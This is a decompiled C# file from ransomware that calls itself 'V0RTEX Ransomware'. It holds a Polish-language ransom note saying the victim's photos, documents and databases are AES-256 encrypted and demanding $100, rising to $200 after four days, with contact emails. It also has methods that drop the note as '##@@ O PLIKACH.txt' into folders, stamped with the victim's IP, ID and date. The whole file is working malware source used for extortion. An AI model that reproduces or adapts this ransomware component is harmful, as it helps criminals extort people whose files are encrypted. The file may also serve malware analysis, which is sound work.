using System;
using System.IO;
using System.Text;

public static class GClass7
{
	public static string String_0
	{
		get
		{
			StringBuilder stringBuilder = new StringBuilder();
			stringBuilder.AppendLine("    ");
			stringBuilder.AppendLine("                                                                          ____________________________________________________________");
			stringBuilder.AppendLine("                                                                          |                                                          |");
			stringBuilder.AppendLine("                                                                          |       V_ 0 _ R _ T _ E _ X  –  –  R_a_n_s_o_m_w_a_r_e    |");
			stringBuilder.AppendLine("                                                                          |                                                          |");
			stringBuilder.AppendLine("                                                                          ------------------------------------------------------------");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                <>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                                                                                            !!!!   U W A G A   !!!! ");
			stringBuilder.AppendLine("            ");
			stringBuilder.AppendLine("                Masz Problem Ze Znalezieniem Potrzebnych Danych ?   ");
			stringBuilder.AppendLine("            ");
			stringBuilder.AppendLine("                Nie Możesz Otworzyć Swoich Dokumentów? ");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("                Po Otworzeniu Ważnych Plików Widzisz Tylko Nic Nie Mówiący, Dziwny Ciąg Znaków? ");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("");
			stringBuilder.AppendLine("                Twoje Istotne Pliki Zostały Zaszyfrowane !");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Twoje Zdjęcia, Dokumenty, Bazy Danych, Zostały Zaszyfrowane Niemozliwym Do Zlamania Algorytmem Aes-256 ");
			stringBuilder.AppendLine("                Metody Tej Do Szyfrowania Zawartosci Dokumentów Uzywaja Sluzby Wywiadowcze I Wojsko.");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                <>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Gdy To Czytasz Proces Jest Zakończony, Wytypowane Pliki Zostały Zaszyfrowane A Sam Program Usunięty Z Twojego Komputera. ");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Odzyskac Twoje Dane Mozna Tylko Przy Pomocy Dedykowanego Programu Deszyfrującego, Wraz Z Jednorazowym Kluczem Wygenerowanym Unikalnie Dla Ciebie! ");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Dwa Pliki Odszyfrujemy Bez Opłaty Aby Nie Być Gołosłownymi, Za Pozostałe Będziecie Państwo Musieli Zapłacić 100$");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Aby Odzyskać Pliki Skontaktuj Się Z Nami wysyłając mail pod oba adresy vortex@deszyfracja.int.pl oraz  Hc9@goat.si");
			stringBuilder.AppendLine("                 ");
			stringBuilder.AppendLine("                Radzimy Decydować Się Szybko, 4 Dni Od Zaszyfrowania Opłata Zostanie Podniesiona Do 200$.");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                <>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>-<>");
			stringBuilder.AppendLine("                ");
			stringBuilder.AppendLine("                Kontaktujac Sie Z Nami Pamietaj Aby Podac Id-komputera I Date");
			stringBuilder.AppendLine("                ");
			return stringBuilder.ToString();
		}
	}

	public static void smethod_0(string string_0, string string_1, string string_2, DateTime dateTime_0, string string_3 = "##@@ O PLIKACH.txt")
	{
		try
		{
			string arg = dateTime_0.ToString("dd-MM-yyyy HH:mm:ss");
			File.WriteAllText(Path.Combine(string_0, string_3), String_0 + $"                DANE: IP={string_1} ID={string_2} Data={arg}");
		}
		catch
		{
		}
	}

	public static bool smethod_1(string string_0, string string_1 = "##@@ O PLIKACH.txt")
	{
		return File.Exists(Path.Combine(string_0, string_1));
	}
}
